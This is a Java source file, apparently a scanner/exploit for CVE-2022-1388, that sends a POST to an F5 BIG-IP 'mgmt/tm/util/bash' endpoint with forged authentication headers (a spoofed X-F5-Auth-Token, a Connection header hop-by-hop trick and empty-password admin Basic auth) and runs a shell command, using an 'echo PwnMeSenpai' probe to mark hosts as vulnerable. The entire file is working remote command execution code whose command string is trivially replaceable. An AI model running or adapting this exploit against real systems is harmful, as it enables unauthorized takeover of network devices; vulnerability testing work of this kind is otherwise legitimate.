//Author: Zeyad Azima
//Linkedin: https://www.linkedin.com/in/zer0verflow/
//Github: https://github.com/Zeyad-Azima
package cve_2022_1388;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.*;
import java.net.HttpURLConnection;
import java.net.SocketException;
import java.net.URL;

public class sendCommand {

    private String target;
    private static String line = null;
    private static final String endPoint = "mgmt/tm/util/bash";


    public sendCommand(String url) {
        this.target = url;
    }

    public void sendReq() throws Exception {

        System.out.println("[+] Scanning "+this.target);
        if (!this.target.endsWith("/")){
            this.target = this.target+"/"+endPoint;
        } else if (this.target.endsWith("/")){
            this.target = this.target+endPoint;
        }
        try {
            URL obj = new URL(this.target);
            HttpURLConnection con = (HttpURLConnection) obj.openConnection();
            con.setDoOutput(true);
            con.setDoInput(true);
            //con.setRequestProperty("Accept-Encoding:","gzip, deflate");
            con.setRequestProperty("Accept", "*/*");
            con.setRequestProperty("Connection", "close, X-F5-Auth-Token, X-Forwarded-For, Local-Ip-From-Httpd, X-F5-New-Authtok-Reqd, X-Forwarded-Server, X-Forwarded-Host");
            con.setRequestProperty("Content-Type", "application/json");
            con.setRequestProperty("X-F5-Auth-Token", "anything");
            con.setRequestProperty("Authorization", "Basic YWRtaW46");
            JSONObject pay = new JSONObject();
            pay.put("command", "run");
            pay.put("utilCmdArgs", "-c 'echo PwnMeSenpai'");
            con.setRequestMethod("POST");
            OutputStreamWriter wr = new OutputStreamWriter(con.getOutputStream());
            wr.write(pay.toString());
            wr.flush();


            StringBuilder sB = new StringBuilder();
            BufferedReader br = new BufferedReader(
                    new InputStreamReader(con.getInputStream(), "UTF-8"));
            while ((line = br.readLine()) != null) {
                sB.append(line + "\n");

            }
            br.close();
            String responseParsing = "" + sB.toString();

            JSONObject response = new JSONObject(responseParsing);
            String notFinalResult = response.getString("commandResult");
            String finalResult = notFinalResult.replace("\n", "");

            if (finalResult.equals("PwnMeSenpai")) {
                System.out.println("[+] " + this.target + " ====> vulnarable.\n");

            } else {
                System.out.println("[-] " + this.target + " may not be vulnerable.");
                System.out.println("[-] Status code: " + con.getResponseCode());
                System.out.println("[-] Response data:\n" + responseParsing + "\n");
            }
        } catch (FileNotFoundException e){
            System.out.println("[-] Path may not be found");
            System.out.println(e);
            System.out.println("");
        } catch (SocketException e){
            System.out.println("[-] Connection error");
            System.out.println(e);
            System.out.println("");
        } catch (IOException e){
            System.out.println("[-] Responsing error");
            System.out.println(e);
            System.out.println("");
        } catch (org.json.JSONException e){
            System.out.println("[-] Response data error");
            System.out.println(e);
            System.out.println("");
        }




    }

}
